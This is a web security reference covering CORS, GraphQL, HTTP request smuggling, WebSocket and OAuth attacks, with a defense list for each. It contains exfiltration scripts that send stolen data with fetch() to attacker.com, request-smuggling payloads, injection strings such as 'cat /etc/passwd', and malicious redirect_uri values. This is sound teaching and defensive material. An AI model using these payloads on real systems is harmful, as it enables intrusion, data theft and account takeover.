# Modern Web-Protocol Security

> **Source**: distilled from the WooYun database, OWASP, and industry practice, covering the five modern web-protocol attack surfaces: CORS, GraphQL, HTTP smuggling, WebSocket, OAuth.
> **Methodology**: the WooYun vulnerability-essence formula + L1-L4 systematic analysis

---

## 1. CORS Misconfiguration

### 1.1 Nature of the Vulnerability

```
CORS risk = an overly broad Access-Control-Allow-Origin x sensitive endpoints lacking extra auth
```

The same-origin policy is a security barrier; a CORS misconfiguration breaks it, letting a malicious site read the user's sensitive data cross-origin.

### 1.2 Detection Methods

```bash
# basic detection: send a custom Origin and observe the response
curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
# check the response headers:
# Access-Control-Allow-Origin: https://evil.com  -> dangerous!
# Access-Control-Allow-Credentials: true          -> cross-origin requests can carry cookies
```

**Dangerous configuration patterns**

| Pattern | Risk | Notes |
|------|------|------|
| `Access-Control-Allow-Origin: *` | High | Wildcard; any origin can read (but cannot send cookies) |
| Dynamically reflected Origin | Very high | Returning the request Origin directly as a response header |
| `null` Origin allowed | High | `<iframe sandbox>` can produce a null origin |
| Regex-match flaw | High | `evil.com.attacker.com` matches `evil.com` |
| Subdomain wildcard | Medium | `*.target.com` includes a compromised subdomain |

### 1.3 Exploitation

```html
<!-- malicious page: steal user data cross-origin -->
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)));
</script>

<!-- null-Origin exploitation -->
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
fetch('https://target.com/api/userinfo',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>">
</iframe>
```

### 1.4 Defenses

- **Strictly allowlist the Origin**: do not reflect it dynamically; use an exact-match list
- Never use `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`
- Avoid allowing a `null` Origin
- Regex matches must be anchored (^ and $) to prevent substring-match bypass
- Add extra auth like a CSRF token to sensitive endpoints; do not rely on CORS alone

---

## 2. GraphQL Security

### 2.1 Nature of the Vulnerability

```
GraphQL risk = powerful query capability x introspection open by default x lack of fine-grained authorization
```

A single GraphQL endpoint exposes the whole data model, and introspection provides full API docs, so the attacker does not need to guess endpoints.

### 2.2 Introspection Queries - Information Disclosure

```graphql
# fetch the full schema (types, fields, args)
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# minimal version: fetch only the query types
{__schema{queryType{name,fields{name}}}}

# fetch the mutation list
{__schema{mutationType{name,fields{name,args{name}}}}}
```

### 2.3 Common Attack Vectors

**Injection attacks**

```graphql
# parameter concatenation causes SQL injection
{ user(name: "admin' OR '1'='1") { id email } }

# NoSQL injection
{ user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
```

**Batch-query DoS (nested queries exhaust resources)**

```graphql
# deep nesting - exponential database queries
{ user(id:1) { friends { friends { friends { friends { name } } } } } }

# alias batch query - enumerate lots of data in one request
{ a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }

# batch-mutation brute force
mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
```

**Authentication bypass**

```graphql
# the mutation lacks an authorization check
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

### 2.4 Defenses

- **Disable introspection in production**: check for and reject `__schema`/`__type` requests
- Query-depth limits (recommend max 10 levels) and complexity analysis
- Rate limiting and query timeouts (prevent batch/nested DoS)
- Field-level access control (each resolver authorizes independently)
- Parameterize input (prevent injection); no string-concatenated queries
- Use persisted queries; only allow pre-registered queries to run

---

## 3. HTTP Request Smuggling

### 3.1 Nature of the Vulnerability

```
The front-end proxy (CDN/LB) and the back-end server parse HTTP request boundaries inconsistently
-> an extra request is "smuggled" within one TCP connection -> affects other users' request handling
```

Core conflict: when both `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE) are present, the front and back ends parse using different headers.

### 3.2 Three Attack Types

| Type | Front-end parsing | Back-end parsing | Notes |
|------|----------|----------|------|
| CL.TE | Content-Length | Transfer-Encoding | Front end forwards by CL, back end parses by TE |
| TE.CL | Transfer-Encoding | Content-Length | Front end forwards by TE, back end parses by CL |
| TE.TE | Transfer-Encoding | Transfer-Encoding | Obfuscate the TE header so one side ignores it |

### 3.3 Classic Payloads

**CL.TE smuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL smuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**TE.TE obfuscation variant**

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding:chunked
```

### 3.4 Detection and Exploitation

```
Detection method:
1. Send a CL/TE-conflicting request and observe timeouts / abnormal responses
2. Smuggle an incomplete request and see whether following requests are affected
3. Tool: the Burp Suite HTTP Request Smuggler extension

Exploitation scenarios:
- Bypass the front-end WAF/ACL -> smuggle a malicious request to the back end
- Hijack other users' requests -> steal cookies/sessions
- Cache poisoning -> a smuggled request pollutes CDN-cached content
- Request-routing hijack -> direct requests to an arbitrary back end
```

### 3.5 Defenses

- Use the same HTTP-parsing library/version front and back
- Forbid both CL and TE headers at once; reject ambiguous requests
- Disable HTTP/1.0 keep-alive back-end connection reuse
- Upgrade to HTTP/2 (a binary-framed protocol, naturally immune to CL/TE ambiguity)
- Have the CDN/LB normalize request headers before forwarding

---

## 4. WebSocket Security

### 4.1 Nature of the Vulnerability

```
WebSocket risk = leaving the traditional security model after the HTTP handshake x a persistent bidirectional channel lacking per-message auth
```

Once a WebSocket connection is established, later messages no longer pass through standard HTTP security (cookie SameSite / CSRF token, etc.).

### 4.2 Cross-Site WebSocket Hijacking (CSWSH)

```html
<!-- malicious page: hijack the user's WebSocket connection -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getPrivateData"}');  // send the request as the victim
};
ws.onmessage = function(e) {
    // steal the response data
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

**How it works**: the WebSocket handshake is a standard HTTP request, so the browser sends cookies automatically. If the server does not validate the Origin header, a malicious page can open an authenticated ws connection.

### 4.3 Message Injection

```javascript
// send an injection payload over WebSocket
ws.send('{"query": "admin\' OR 1=1--"}');          // SQL injection
ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
ws.send('{"cmd": "ls; cat /etc/passwd"}');           // command injection
```

### 4.4 Insufficient Authentication

| Issue | Risk | Notes |
|------|------|------|
| Auth only at handshake | The connection stays valid after the session expires | A ws connection can last hours |
| No message-level auth | Any connected client can perform all actions | Missing per-message authorization checks |
| Cleartext token transport | Unencrypted WebSocket (ws://) | Use wss:// to force encryption |

### 4.5 Defenses

- **Validate the Origin header**: check the Origin against the allowlist at handshake (prevent CSWSH)
- **Token auth**: pass the token via a URL parameter or the first message at handshake (do not rely on cookies)
- **Message validation**: validate input and encode output per message (prevent injection)
- Use wss:// to force encrypted transport
- Implement heartbeats and automatic disconnect on session timeout
- Message rate limiting (prevent DoS)

---

## 5. OAuth 2.0 / OIDC Security

### 5.1 Nature of the Vulnerability

```
OAuth risk = a complex multi-party flow x lax parameter validation x implementation deviating from the spec
```

The OAuth flow involves three parties (client, authorization server, resource server); a misconfiguration at any point can leak tokens or lead to account takeover.

### 5.2 redirect_uri Manipulation

```
# normal flow
https://auth.target.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback

# attack: tamper with redirect_uri to steal the authorization code
redirect_uri=https://attacker.com/steal           # full replacement
redirect_uri=https://app.com.attacker.com/callback # subdomain confusion
redirect_uri=https://app.com/callback/../../../attacker # path traversal
redirect_uri=https://app.com/callback?next=https://attacker.com # open-redirect chain
```

### 5.3 Common Attack Vectors

| Attack type | Principle | Exploitation conditions |
|----------|------|----------|
| CSRF attack | Missing or predictable state parameter | Bind the attacker's account to the victim |
| Token leak (Referer) | Implicit-flow token in the URL fragment | Page references external resources |
| Token leak (logs) | Auth code / token recorded in server logs | Logs are accessible |
| PKCE bypass | A public client not using code_challenge | Intercept the auth code to exchange for a token |
| IdP Mix-Up | Confuse the source of the auth response in a multi-IdP setup | Client supports multiple OAuth providers |
| Auth-code replay | The auth code is not single-use | Intercept and re-redeem the auth code |

### 5.4 CSRF and the state Parameter

```
# attack flow (when state is missing)
1. The attacker starts OAuth authorization and gets the auth code for their own account
2. Craft the link: https://app.com/callback?code=ATTACKER_CODE
3. Trick the victim into clicking -> the victim's account binds to the attacker's third-party account
4. The attacker logs in with the third-party account -> takes over the victim's account

# defense: the state parameter
state=<random unpredictable value> (bound to the user's session)
-> at the callback, verify state matches the session
```

### 5.5 Implicit-Flow Risks

```
# Implicit Flow - no longer recommended
https://app.com/callback#access_token=eyJ...&token_type=bearer

Risks:
- The token is in the URL fragment and can leak via browser history / Referer header
- Cannot use a refresh_token, poor UX
- Cannot bind the client identity (no client_secret)

-> alternative: Authorization Code Flow + PKCE
```

### 5.6 Defenses

- **Strict redirect_uri allowlist**: exact match (no wildcards/subpaths)
- **Enforce the state parameter**: bound to the session, unpredictable, single-use
- **Enforce PKCE**: all clients (especially public clients/SPAs) must use code_challenge
- Use the Authorization Code Flow; abandon the Implicit Flow
- The authorization code is single-use with a short lifetime (recommend under 10 minutes)
- Token binding (DPoP/mTLS) prevents token theft
- Periodically audit authorized third-party apps and their scopes

---

*Distilled from the WooYun vulnerability database (88,636 entries) + OWASP/RFC standards | for security research and defense reference only*
